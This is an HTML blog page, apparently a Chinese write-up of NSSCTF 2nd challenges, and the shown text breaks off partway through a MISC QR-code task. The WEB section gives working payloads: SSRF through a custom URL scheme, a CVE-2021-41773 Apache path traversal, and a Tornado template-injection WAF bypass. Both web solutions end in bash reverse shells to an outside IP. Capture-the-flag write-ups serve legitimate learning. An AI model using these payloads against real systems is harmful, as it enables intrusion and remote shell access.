@@ -1,0 +1,816 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="dddkia">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="NSSCTF 2nd">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSCTF 2nd">
+<meta property="og:url" content="http://example.com/2023/09/18/NSSCTF%202nd/index.html">
+<meta property="og:site_name" content="dddkia">
+<meta property="og:description" content="NSSCTF 2nd">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/background/fj_img/20.jpg">
+<meta property="article:published_time" content="2023-09-18T03:38:13.000Z">
+<meta property="article:modified_time" content="2023-11-22T02:50:01.243Z">
+<meta property="article:author" content="dddkia">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="misc">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/background/fj_img/20.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>NSSCTF 2nd - dddkia</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"e7e2e2a4f3afffec42c991b23b3b4278","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?e7e2e2a4f3afffec42c991b23b3b4278";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>dddkia</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/fj_img/20.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="NSSCTF 2nd"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-18 11:38" pubdate>
+          2023年9月18日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          18k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          74 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">NSSCTF 2nd</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="NSSCTF-2nd"><a href="#NSSCTF-2nd" class="headerlink" title="NSSCTF 2nd"></a>NSSCTF 2nd</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="MyBox-revenge"><a href="#MyBox-revenge" class="headerlink" title="MyBox(revenge)"></a>MyBox(revenge)</h2><p>给了一个url的参数，可以利用file读文件</p>
+<p><code>?url=file:///etc/passwd</code></p>
+<p><img src="/assets/17006210687199.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>ban了<code>/proc/1/environ</code>，<code>/start.sh</code>等非预期</p>
+<p>读<code>/app/app.py</code>拿到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs Plain">from flask import Flask, request, redirect<br>import requests, socket, struct<br>from urllib import parse<br>app = Flask(__name__)<br><br>@app.route(&#x27;/&#x27;)<br>def index():<br>    if not request.args.get(&#x27;url&#x27;):<br>        return redirect(&#x27;/?url=dosth&#x27;)<br>    url = request.args.get(&#x27;url&#x27;)<br>    if url.startswith(&#x27;file://&#x27;):<br>        if &#x27;proc&#x27; in url or &#x27;flag&#x27; in url:<br>            return &#x27;no!&#x27;<br>        with open(url[7:], &#x27;r&#x27;) as f:<br>            data = f.read()<br>            if url[7:] == &#x27;/app/app.py&#x27;:<br>                return data<br>            if &#x27;NSSCTF&#x27; in data:<br>                return &#x27;no!&#x27;<br>            return data<br>    elif url.startswith(&#x27;http://localhost/&#x27;):<br>        return requests.get(url).text<br>    elif url.startswith(&#x27;mybox://127.0.0.1:&#x27;):<br>        port, cont    ent = url[18:].split(&#x27;/_&#x27;, maxsplit=1)<br>        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        s.settimeout(5)<br>        s.connect((&#x27;127.0.0.1&#x27;, int(port)))<br>        s.send(parse.unquote(content).encode())<br>        res = b&#x27;&#x27;<br>        while 1:<br>            data = s.recv(1024)<br>            if data:<br>                res += data<br>            else:<br>                break<br>        return res<br>    return &#x27;&#x27;<br><br>app.run(&#x27;0.0.0.0&#x27;, 827)<br></code></pre></td></tr></table></figure>
+
+<p>重点看23行<code>elif url.startswith(&#39;mybox://127.0.0.1:&#39;):</code>，建立了一个到127.0.0.1上的指定端口（827）的TCP的socket通信</p>
+<p>相当于一个gopher协议的替换，即把gopher:&#x2F;&#x2F;127.0.0.1改成mybox:&#x2F;&#x2F;127.0.01</p>
+<p>然后目的很明显了，gopher打ssrf</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> urllib.parse<br>test =<span class="hljs-string">&quot;&quot;&quot;GET /flag HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;mybox://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-comment">#注意两次url编码</span><br><span class="hljs-built_in">print</span>(urllib.parse.quote(result))<br></code></pre></td></tr></table></figure>
+
+<p>以为flag在当前目录，回显404，但是这里有一个关键，Apache版本为2.4.49，以前复现过的CVE-2021-41773，可以目录穿越</p>
+<p><img src="/assets/17006210686831.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>CVE-2021-41773的payload:<code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> urllib.parse<br>test =<span class="hljs-string">&quot;&quot;&quot;GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 51</span><br><span class="hljs-string"></span><br><span class="hljs-string">bash -c &quot;bash -i &amp;&gt; /dev/tcp/1.12.251.62/4567 0&gt;&amp;1&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;mybox://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(urllib.parse.quote(result))<br><span class="hljs-comment">#mybox%3A//127.0.0.1%3A80/_GET%2520/cgi-bin/.%25252e/.%25252e/.%25252e/.%25252e/.%25252e/bin/sh%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252051%250D%250A%250D%250Abash%2520-c%2520%2522bash%2520-i%2520%2526%253E%2520/dev/tcp/1.12.251.62/4567%25200%253E%25261%2522%250D%250A</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/17006210686832.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">daemon@d22eb7fdd4144138:/<span class="hljs-built_in">bin</span>$ cat /nevvvvvver_f1nd_m3_the_t3ue_flag<br><br>NSSCTF&#123;dfaa40bc-dab6-433a-a970-ec0e3b5ba084&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="MyHurricane"><a href="#MyHurricane" class="headerlink" title="MyHurricane"></a>MyHurricane</h2><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/123329244">https://blog.csdn.net/miuzzx/article/details/123329244</a></p>
+<p>开局源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> tornado.ioloop<br><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">import</span> os<br><br>BASE_DIR = os.path.dirname(__file__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">data</span>):<br>    bl = [<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;not&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> bl:<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> data.split():<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chunk:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-number">31</span> &lt; <span class="hljs-built_in">ord</span>(c) &lt; <span class="hljs-number">128</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexHandler</span>(tornado.web.RequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            self.finish(f.read())<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self</span>):<br>        data = self.get_argument(<span class="hljs-string">&quot;ssti&quot;</span>)<br>        <span class="hljs-keyword">if</span> waf(data):<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-string">f&quot;&quot;&quot;&lt;html&gt;</span><br><span class="hljs-string">                        &lt;head&gt;&lt;/head&gt;</span><br><span class="hljs-string">                        &lt;body style=&quot;font-size: 30px;&quot;&gt;<span class="hljs-subst">&#123;data&#125;</span>&lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-string">                        &quot;&quot;&quot;</span>)<br>                f.flush()<br>            self.render(<span class="hljs-string">&#x27;1.html&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            self.finish(<span class="hljs-string">&#x27;no no no&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app = tornado.web.Application([<br>            (<span class="hljs-string">r&quot;/&quot;</span>, IndexHandler),<br>        ], compiled_template_cache=<span class="hljs-literal">False</span>)<br>    app.listen(<span class="hljs-number">827</span>)<br>    tornado.ioloop.IOLoop.current().start()<br></code></pre></td></tr></table></figure>
+
+<p>tornado ssti，过滤了<code>[&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;__&#39;, &#39;(&#39;, &#39;)&#39;, &#39;or&#39;, &#39;and&#39;, &#39;not&#39;, &#39;&#123;&#123;', '&#125;&#125;&#39;]</code></p>
+<p>过滤了<code>&#123;&#123;&#125;&#125;</code>用<code>&#123;%%&#125;</code>代替</p>
+<p>过滤了and和or其实就是不能用<code>handler</code>和<code>import</code></p>
+<p>这里利用了<code>_tt_utf8</code>进行变量覆盖，<code>set _tt_utf8=eval</code></p>
+<p>原理</p>
+<p><img src="/assets/17006210686833.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>过滤了单引号和双引号，可能要加另一个变量替换（即$a($b)&amp;$b&#x3D;””），这里利用<code>request.body_arguments[request.method]</code>，返回的变量名为<code>GET</code>、<code>POST</code>…</p>
+<p>最后payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">ssti=&#123;% raw request.body_arguments[request.method][<span class="hljs-number">0</span>]%0a    _tt_utf8 = <span class="hljs-built_in">eval</span>%&#125;&amp;POST=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/1.12.251.62/4567 &lt;%261&#x27;&quot;</span>)<br>ssti=&#123;% <span class="hljs-built_in">set</span> _tt_utf8 =<span class="hljs-built_in">eval</span> %&#125;&#123;% raw request.body_arguments[request.method][<span class="hljs-number">0</span>] %&#125;&amp;POST=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/1.12.251.62/4567 0&lt;%261&#x27;&quot;</span>)<br><br><span class="hljs-comment">#非预期</span><br>ssti=&#123;% include /proc/<span class="hljs-number">1</span>/environ %&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/17006210686844.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/assets/17006210686845.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>flag在env中</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="gift-in-qrcode-revenge"><a href="#gift-in-qrcode-revenge" class="headerlink" title="gift_in_qrcode(revenge)"></a>gift_in_qrcode(revenge)</h2><p>给了源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> qrcode<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randrange, getrandbits, seed<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><br>flag = os.getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)<br><span class="hljs-keyword">if</span> flag == <span class="hljs-literal">None</span>:<br>    flag = <span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span><br><br>secret_seed = randrange(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)<br>seed(secret_seed)<br>reveal = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    reveal.append(<span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">8</span>)))<br>target = getrandbits(<span class="hljs-number">8</span>)<br>reveal = <span class="hljs-string">&quot;,&quot;</span>.join(reveal)<br><br>img_qrcode = qrcode.make(reveal)<br>img_qrcode = img_qrcode.crop((<span class="hljs-number">35</span>, <span class="hljs-number">35</span>, img_qrcode.size[<span class="hljs-number">0</span>] - <span class="hljs-number">35</span>, img_qrcode.size[<span class="hljs-number">1</span>] - <span class="hljs-number">35</span>))<br><br>offset, delta, rate = <span class="hljs-number">50</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span><br>img_qrcode = img_qrcode.resize(<br>    (<span class="hljs-built_in">int</span>(img_qrcode.size[<span class="hljs-number">0</span>] / rate), <span class="hljs-built_in">int</span>(img_qrcode.size[<span class="hljs-number">1</span>] / rate)), Image.LANCZOS<br>)<br>img_out = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, img_qrcode.size)<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img_qrcode.size[<span class="hljs-number">1</span>]):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img_qrcode.size[<span class="hljs-number">0</span>]):<br>        pixel_qrcode = img_qrcode.getpixel((x, y))<br>        <span class="hljs-keyword">if</span> pixel_qrcode == <span class="hljs-number">255</span>:<br>            img_out.putpixel(<br>                (x, y),<br>                (<br>                    randrange(offset, offset + delta),<br>                    randrange(offset, offset + delta),<br>                    randrange(offset, offset + delta),<br>                ),<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            img_out.putpixel(<br>                (x, y),<br>                (<br>                    randrange(offset - delta, offset),<br>                    randrange(offset - delta, offset),<br>                    randrange(offset - delta, offset),<br>                ),<br>            )<br><br>img_out.save(<span class="hljs-string">&quot;qrcode.png&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;qrcode.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This my gift:&quot;</span>)<br><span class="hljs-built_in">print</span>(base64.b64encode(data).decode(), <span class="hljs-string">&quot;\n&quot;</span>)<br><br>ans = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What&#x27;s your answer:&quot;</span>)<br><span class="hljs-keyword">if</span> ans == <span class="hljs-built_in">str</span>(target):<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No no no!&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>题目大致思路：server端给出一个经过像素扰动的qrcode（范围<code>offset, delta, rate = 50, 3, 5</code>）的base64码，这个qrcode扫出来是一个有20个数字的数组，这些数字是由seed随机产生的，服务端接收1个数字，如果这个数字是qrcode里的数组中的第21个，则输出flag</p>
+<p>思路不是很难，因为<code>secret_seed = randrange(1, 1000)</code>，产生随机数的seed给了范围，所以可以爆破第21个数字。主要难点在于像素扰动扫码以及爆破数字</p>
+<p>学习一下wp，使用np.where还原，pyzbar识别二维码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span 